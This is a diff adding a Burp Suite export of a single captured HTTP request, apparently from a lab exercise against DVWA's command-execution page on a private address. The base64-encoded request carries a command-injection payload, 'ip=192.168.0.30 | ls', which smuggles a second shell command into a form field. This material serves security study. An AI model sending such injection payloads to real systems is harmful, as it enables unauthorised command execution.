@@ -1,0 +1,42 @@
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2024.2.1.5" exportTime="Tue May 21 20:38:30 CST 2024">
+  <item>
+    <time>Tue May 21 20:30:43 CST 2024</time>
+    <url><![CDATA[http://192.168.0.39/DVWA/vulnerabilities/exec/]]></url>
+    <host ip="192.168.0.39">192.168.0.39</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/DVWA/vulnerabilities/exec/]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[UE9TVCAvRFZXQS92dWxuZXJhYmlsaXRpZXMvZXhlYy8gSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguMC4zOQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTUuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM2DQpPcmlnaW46IGh0dHA6Ly8xOTIuMTY4LjAuMzkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vMTkyLjE2OC4wLjM5L0RWV0EvdnVsbmVyYWJpbGl0aWVzL2V4ZWMvDQpDb29raWU6IHNlY3VyaXR5PWxvdzsgUEhQU0VTU0lEPTNxcHMxMnJqYXA3aGNhMW84aDNqYXNrbzVkDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCmlwPTE5Mi4xNjguMC4zMCslN0MrbHMmU3VibWl0PVN1Ym1pdA==]]></request>
+    <status></status>
+    <responselength></responselength>
+    <mimetype></mimetype>
+    <response base64="true"></response>
+    <comment></comment>
+  </item>
+</items>
